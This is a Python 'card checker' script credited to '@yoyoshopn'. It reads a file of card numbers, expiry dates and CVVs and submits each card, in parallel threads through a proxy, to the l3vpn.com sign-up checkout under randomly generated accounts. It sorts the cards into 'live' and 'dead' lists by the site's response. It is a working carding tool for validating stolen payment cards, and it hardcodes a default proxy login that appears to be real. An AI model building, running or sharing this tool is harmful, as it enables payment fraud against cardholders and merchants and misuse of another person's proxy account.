import requests
import re
import random
import string
import os
import urllib.parse
import sys
import threading
import concurrent.futures
import shutil

# Enable ANSI colors on Windows
os.system('')

BLUE = "\033[94m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RED = "\033[91m"
GRAY = "\033[90m"
RESET = "\033[0m"

ASCII_ART = """
███╗   ███╗██╗  ██╗██████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗
████╗ ████║██║  ██║██╔══██╗   ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██╔████╔██║███████║██║  ██║   ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║╚██╔╝██║╚════██║██║  ██║   ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║     ██║██████╔╝   ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝     ╚═╝     ╚═╝╚═════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

"""

def print_centered(text, color=""):
    width = shutil.get_terminal_size((80, 20)).columns
    for line in text.strip('\n').split('\n'):
        print(color + line.center(width) + RESET)

write_lock = threading.Lock()

def generate_email_password():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    email = f"{name}{random.randint(100, 999)}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return email, password

def parse_card(card_input):
    # Find all groups of numbers in the input string
    numbers = re.findall(r'\d+', card_input)
    
    # We need at least 4 numeric components for CC, MM, YY, CVV
    if len(numbers) >= 4:
        # Check if the first sequence looks like a credit card number
        if 13 <= len(numbers[0]) <= 19:
            cc = numbers[0]
            mm = numbers[1]
            yy = numbers[2]
            cvv = numbers[3]
            
            # Format month to be 2 digits
            if len(mm) == 1:
                mm = "0" + mm
                
            # If month > 12 and year <= 12, they might be swapped
            if int(mm) > 12 and int(yy) <= 12:
                mm, yy = yy, mm
                if len(mm) == 1:
                    mm = "0" + mm
                    
            # Format year to be 4 digits
            if len(yy) == 2:
                yy = "20" + yy
                
            # Final validation
            if len(yy) == 4 and 1 <= int(mm) <= 12 and 3 <= len(cvv) <= 4:
                return cc, mm, yy, cvv
                
    return None

def append_to_file(filepath, text):
    with write_lock:
        with open(filepath, "a", encoding="utf-8") as f:
            f.write(text + "\n")

def format_proxy(proxy_str):
    parts = proxy_str.split(":", 3)
    if len(parts) == 4:
        host, port, user, pwd = parts
        pwd_safe = urllib.parse.quote(pwd)
        return f"http://{user}:{pwd_safe}@{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    elif proxy_str.startswith("http"):
        return proxy_str
    return f"http://{proxy_str}"

def check_single_card(card_input, proxy_url, live_file, dead_file):
    parsed = parse_card(card_input)
    if not parsed:
        print(f"{RED}❌ Invalid format: {card_input}{RESET}")
        return

    cc, mm, yy, cvv = parsed
    email, password = generate_email_password()
    full_card = f"{cc}|{mm}|{yy}|{cvv}"

    session = requests.Session()
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://l3vpn.com",
        "Pragma": "no-cache",
        "Referer": "https://l3vpn.com/account/sign-up",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    }

    post_data_1 = {
        "product": "0-0",
        "email": email,
        "password1": password,
        "password2": password,
        "payment_method": "stripe.card",
        "cc_last_name": "test",
        "cc_first_name": "test",
        "credit_number": cc,
        "credit_expires": f"{mm} / {yy[-2:]}",
        "credit_cvc": cvv,
        "coupon_code": "",
        "signup": "1"
    }

    try:
        session.post("https://l3vpn.com/account/sign-up", headers=headers, data=post_data_1, timeout=20)
        post_data_2 = {"confirm": "1"}
        res2 = session.post("https://l3vpn.com/account/sign-up", headers=headers, data=post_data_2, timeout=20)
        html = res2.text.lower()

        if "card was declined" in html:
            print(f"{RED}[-] Declined {full_card} → Card was declined{RESET}")
            append_to_file(dead_file, full_card)
        elif "incorrect" in html or "invalid" in html:
            print(f"{RED}[-] Declined {full_card} → Invalid card{RESET}")
            append_to_file(dead_file, full_card)
        elif "thank you" in html or "success" in html:
            print(f"{GREEN}[+] Charged {full_card} → Success{RESET}")
            append_to_file(live_file, full_card)
        else:
            match = re.search(r"<div class='alert-error alert'>(.*?)</div", html)
            if match:
                print(f"{RED}[-] {full_card} → {match.group(1).strip()}{RESET}")
                append_to_file(dead_file, full_card)
            else:
                print(f"{YELLOW}[?] Unknown {full_card}{RESET}")
                append_to_file(dead_file, f"{full_card}")
    except Exception as e:
        print(f"{RED}[-] Error {full_card} → {str(e)}{RESET}")
        append_to_file(dead_file, full_card)

def main():
    # Clear screen for cleaner look
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print_centered(ASCII_ART, BLUE)
    subtitle = "[ Coded by @yoyoshopn ]"
    print(YELLOW + subtitle.center(shutil.get_terminal_size((80, 20)).columns) + RESET + "\n")

    file_path = input(f"{BLUE}[!]{RESET} Enter combo file path: ").strip()
    
    # Remove quotes if user dragged and dropped the file
    if file_path.startswith('"') and file_path.endswith('"'):
        file_path = file_path[1:-1]
    elif file_path.startswith("'") and file_path.endswith("'"):
        file_path = file_path[1:-1]
        
    # Auto-add .txt if they forgot it and the file isn't found
    if not os.path.exists(file_path) and os.path.exists(file_path + ".txt"):
        file_path += ".txt"
    
    default_proxy = "px022507.pointtoserver.com:10780:purevpn0s13944929:e4GYmaf7s5y@"
    print(f"{BLUE}[!]{RESET} Default Proxy available: {GRAY}{default_proxy}{RESET}")
    proxy_input = input(f"{BLUE}[!]{RESET} Enter proxy (user:pass@ip:port) or ENTER for default (type 'none' for no proxy): ").strip()

    proxy_url = None
    if proxy_input.lower() == 'none':
        proxy_url = None
    elif proxy_input == "":
        proxy_url = format_proxy(default_proxy)
    else:
        proxy_url = format_proxy(proxy_input)

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            cards = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED}❌ Error loading file: {e}{RESET}")
        input("\nPress Enter to exit...")
        return

    print(f"\n{GRAY}[*] Loaded {len(cards)} cards.{RESET}")

    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    hits_dir = os.path.join(downloads_path, "hits")
    os.makedirs(hits_dir, exist_ok=True)
    live_file = os.path.join(hits_dir, "live.txt")
    dead_file = os.path.join(hits_dir, "deads.txt")

    print(f"{GRAY}[*] Saving Live cards to {live_file}{RESET}")
    print(f"{GRAY}[*] Saving Dead cards to {dead_file}{RESET}\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(check_single_card, card, proxy_url, live_file, dead_file) for card in cards]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{RED}❌ Thread error: {e}{RESET}")

    print(f"\n{GREEN}[✓] Finished checking all cards!{RESET}")
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
